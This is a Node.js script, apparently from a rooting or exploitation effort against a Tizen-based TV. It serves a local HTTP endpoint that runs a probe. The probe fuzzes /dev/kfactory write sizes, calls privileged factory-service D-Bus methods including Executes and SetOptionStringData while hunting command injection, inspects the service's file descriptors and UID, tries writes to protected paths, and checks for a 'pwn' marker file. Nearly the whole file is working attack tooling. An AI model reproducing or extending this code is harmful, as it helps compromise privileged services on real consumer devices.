'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8179;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe90h.txt';
var PWN = '/tmp/pwn90h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. /dev/kfactory write size sweep 33..256 (look for written > 0)
  'r.kfac_right_size = [];',
  'for (var sz = 33; sz <= 256; sz++) {',
  '  try {',
  '    var wfd = fs.openSync("/dev/kfactory", "w");',
  '    var wb = new Buffer(sz);',
  '    wb.fill(0);',
  '    var wn = fs.writeSync(wfd, wb, 0, sz);',
  '    fs.closeSync(wfd);',
  '    if (wn > 0) r.kfac_right_size.push({ sz: sz, written: wn });',
  '  } catch(e) {}',
  '}',

  // 2. Dmesg after size sweep - check if any size stopped producing "size is wrong"
  'try {',
  '  var o_dm = cp.spawnSync("dmesg",[],{timeout:5000});',
  '  var dm_lines = (o_dm.stdout||new Buffer(0)).toString().split("\\n");',
  '  var kfac_lines = dm_lines.filter(function(l){ return l.indexOf("kfactory")>-1; });',
  '  r.dmesg_kfac_last10 = kfac_lines.slice(-10).join("\\n").slice(0,2000);',
  '  r.dmesg_kfac_total = kfac_lines.length;',
  '} catch(e) {}',

  // 3. GetItem(12) and GetOptionStringData(12)
  'try {',
  '  var o_gi = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetItem","12"],{timeout:5000});',
  '  r.get_item_12 = (o_gi.stdout||new Buffer(0)).toString().trim().slice(0,300);',
  '} catch(e) { r.get_item_12_err = e.message.slice(0,60); }',
  'try {',
  '  var o_go = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetOptionStringData","12"],{timeout:5000});',
  '  r.get_opt_12 = (o_go.stdout||new Buffer(0)).toString().trim().slice(0,300);',
  '} catch(e) { r.get_opt_12_err = e.message.slice(0,60); }',

  // 4. SetOptionStringData(12) with benign value then read back
  'try {',
  '  var o_so = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData","12","test","4"],{timeout:5000});',
  '  r.set_opt_12_test = (o_so.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '} catch(e) { r.set_opt_12_test_err = e.message.slice(0,60); }',
  'try {',
  '  var o_go2 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetOptionStringData","12"],{timeout:5000});',
  '  r.get_opt_12_after = (o_go2.stdout||new Buffer(0)).toString().trim().slice(0,300);',
  '} catch(e) {}',

  // 5. kfactoryd PID and open file descriptors
  'try {',
  '  var o_fpid = cp.spawnSync("gdbus",["call","--system","--dest","org.freedesktop.DBus","--object-path","/","--method","org.freedesktop.DBus.GetConnectionUnixProcessID","org.tizen.tv.factory-service"],{timeout:5000});',
  '  var fpid_str = (o_fpid.stdout||new Buffer(0)).toString().trim();',
  '  r.kfac_pid_raw = fpid_str;',
  '  var fp_m = fpid_str.match(/(\\d+)/);',
  '  if (fp_m) {',
  '    var fpid = fp_m[1];',
  '    r.kfac_pid = fpid;',
  '    try { r.kfac_fds = fs.readdirSync("/proc/"+fpid+"/fd"); } catch(e) { r.kfac_fds_err = e.message; }',
  '    try {',
  '      var kfac_maps = [];',
  '      r.kfac_fds.forEach(function(fd) {',
  '        try {',
  '          var lnk = fs.readlinkSync("/proc/"+fpid+"/fd/"+fd);',
  '          kfac_maps.push(fd + " -> " + lnk);',
  '        } catch(e) {}',
  '      });',
  '      r.kfac_fd_links = kfac_maps.slice(0, 30);',
  '    } catch(e) {}',
  '    try {',
  '      var kst = fs.readFileSync("/proc/"+fpid+"/status","utf8");',
  '      var uid_m = kst.match(/^Uid:\\t(\\d+)/m);',
  '      r.kfac_uid = uid_m ? uid_m[1] : "?";',
  '    } catch(e) {}',
  '  }',
  '} catch(e) { r.kfac_pid_err = e.message.slice(0,80); }',

  // 6. Check /run/factory/ writability
  'try {',
  '  fs.writeFileSync("/run/factory/tbtest90h", "test");',
  '  r.run_factory_writable = true;',
  '  fs.unlinkSync("/run/factory/tbtest90h");',
  '} catch(e) { r.run_factory_write_err = e.message.slice(0,60); }',
  'try { r.src_info_source = fs.readFileSync("/run/factory/src_info_source","utf8").trim().slice(0,100); } catch(e) { r.src_info_source_err = e.code; }',

  // 7. Try creating /opt/usr/apps/factory-service/share/db_initialized
  'try {',
  '  fs.writeFileSync("/opt/usr/apps/factory-service/share/db_initialized", "1");',
  '  r.db_init_created = true;',
  '} catch(e) { r.db_init_create_err = e.message.slice(0,80); }',

  // 8. Try injection via SetOptionStringData key 0 with the full format: SetOptionStringData(0, cmd, len)
  //    Try key range 0..20 to find one that returns (0,) instead of (-4,) or (-1,)
  'r.opt_set_results = {};',
  'for (var ok = 0; ok <= 20; ok++) {',
  '  try {',
  '    var o_s = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData",String(ok),"test","4"],{timeout:3000});',
  '    var sout = (o_s.stdout||new Buffer(0)).toString().trim();',
  '    r.opt_set_results["k"+ok] = sout.slice(0,50);',
  '  } catch(e) {}',
  '}',

  // 9. After FacAppStart success, try Executes with key 12 again + fresh dmesg
  'try {',
  '  var o_ex = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes","12","0"],{timeout:5000});',
  '  r.exec12_fresh = (o_ex.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '} catch(e) { r.exec12_fresh_err = e.message.slice(0,60); }',
  'try {',
  '  var o_dm3 = cp.spawnSync("dmesg",[],{timeout:5000});',
  '  var dm3 = (o_dm3.stdout||new Buffer(0)).toString().split("\\n");',
  '  r.dmesg_after_exec12 = dm3.filter(function(l){ return l.indexOf("factory")>-1||l.indexOf("kfac")>-1||l.indexOf("execl")>-1||l.indexOf("shell")>-1||l.indexOf("before")>-1; }).slice(-20).join("\\n").slice(0,2000);',
  '} catch(e) {}',

  // 10. GetFString (ftype 0..10) - returns factory strings we might be able to inject into
  'r.fstrings = {};',
  'for (var ft = 0; ft <= 10; ft++) {',
  '  try {',
  '    var o_fs = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetFString",String(ft)],{timeout:3000});',
  '    var fsout = (o_fs.stdout||new Buffer(0)).toString().trim();',
  '    if (fsout && fsout !== "(1,)") r.fstrings["ft"+ft] = fsout.slice(0,100);',
  '  } catch(e) {}',
  '}',

  // 11. Final pwn check
  'try { r.pwn_final = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) { r.pwn_final_err = e.code; }',

  'var out = JSON.stringify(r,null,2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '",out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 150000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
